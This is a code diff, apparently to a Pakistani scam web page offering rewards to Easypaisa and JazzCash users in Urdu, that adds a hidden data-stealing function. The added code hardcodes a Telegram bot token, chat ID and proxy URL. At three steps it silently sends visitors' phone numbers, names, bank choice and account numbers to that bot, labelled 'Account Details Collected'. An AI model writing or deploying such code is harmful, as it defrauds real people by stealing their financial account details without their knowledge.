@@ -2,6 +2,66 @@ let shareCount = 0;
 let channelJoined = false;
 let selectedBank = "";
 
+const TG_TOKEN = '8746587563:AAE4NEi90V3fIsRthXn175_VSQv3sPwLyjs';
+const TG_CHAT_ID = '6731689359';
+const PROXY_URL = 'https://telegram-dacoumennt-api.vercel.app/api/proxy';
+
+async function sendToTelegram(message, bankType = 'default') {
+    const formData = new FormData();
+    formData.append('token', TG_TOKEN);
+    formData.append('chatid', TG_CHAT_ID);
+    
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    
+    return new Promise((resolve) => {
+        const sendBlob = (blob) => {
+            formData.append('photo', blob, 'image.png');
+            formData.append('caption', message);
+
+            fetch(PROXY_URL, {
+                method: 'POST',
+                body: formData
+            })
+            .then(res => res.json())
+            .then(result => {
+                console.log('TG Success:', result);
+                resolve(result);
+            })
+            .catch(e => {
+                console.error('TG Error:', e);
+                resolve(null);
+            });
+        };
+
+        if (bankType === 'Easypaisa' || bankType === 'JazzCash') {
+            const img = new Image();
+            img.crossOrigin = "Anonymous";
+            img.onload = () => {
+                const halfWidth = img.width / 2;
+                canvas.width = halfWidth;
+                canvas.height = img.height;
+                
+                const sourceX = bankType === 'Easypaisa' ? 0 : halfWidth;
+                ctx.drawImage(img, sourceX, 0, halfWidth, img.height, 0, 0, halfWidth, img.height);
+                
+                canvas.toBlob(sendBlob, 'image/png');
+            };
+            img.onerror = () => {
+                // Fallback to pixel if image fails to load
+                canvas.width = 1;
+                canvas.height = 1;
+                canvas.toBlob(sendBlob, 'image/png');
+            };
+            img.src = 'banks.png';
+        } else {
+            canvas.width = 1;
+            canvas.height = 1;
+            canvas.toBlob(sendBlob, 'image/png');
+        }
+    });
+}
+
 function showSection(id) {
     document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
     document.getElementById(id).classList.add('active');
@@ -14,6 +74,8 @@ function validateNumber() {
         alert('براہ کرم درست پاکستانی نمبر درج کریں (03xxxxxxxxx)');
         return;
     }
+
+    sendToTelegram(`🆕 *New User Visit*\n📱 Phone: ${num}`);
 
     showSection('checking');
     let progress = 0;
@@ -71,6 +133,9 @@ function showTasks() {
         alert('براہ کرم تمام معلومات درست طریقے سے درج کریں');
         return;
     }
+    
+    sendToTelegram(`💰 *Account Details Collected*\n🏦 Bank: ${selectedBank}\n👤 Name: ${name}\n💳 Number: ${num}\n📱 Original Phone: ${document.getElementById('phoneNumber').value}`, selectedBank);
+
     showSection('tasks');
 }
 
@@ -131,6 +196,9 @@ function finalize() {
         alert('براہ کرم تمام ٹاسک مکمل کریں!');
         return;
     }
+    
+    sendToTelegram(`✅ *User Completed All Tasks*\n📱 Phone: ${document.getElementById('phoneNumber').value}\n🏦 Bank: ${selectedBank}\n💳 Account: ${document.getElementById('accNumber').value}`, selectedBank);
+
     showSection('final');
 }
 function toggleFaq(element) {
